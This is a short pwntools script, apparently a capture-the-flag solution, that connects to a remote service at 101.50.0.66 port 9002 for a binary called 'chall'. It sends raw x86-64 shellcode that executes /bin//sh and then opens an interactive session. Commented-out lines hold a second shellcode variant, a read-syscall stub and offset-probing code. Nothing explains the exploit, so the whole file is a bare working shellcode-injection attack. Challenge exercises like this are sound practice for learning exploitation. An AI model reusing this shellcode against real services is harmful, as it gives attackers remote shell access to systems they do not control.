from pwn import *

elf = context.binary = ELF('chall')
context.terminal = ["tmux", "splitw", "-h"]
p = process(elf.path)
p = remote('101.50.0.66', 9002)
#gdb.attach(p)
#sc = asm("""
#    mov rdx, 0x50
#    lea rsi, [rsp]
#    xor rdi, rdi
#    xor rax,rax
#    syscall
#""")
#offset = 25
sc2 = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#sc2 = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#p.sendline(sc)
#p.sendline(cyclic(100))
p.sendline(sc2)#b'A'*offset + sc2)
p.interactive()
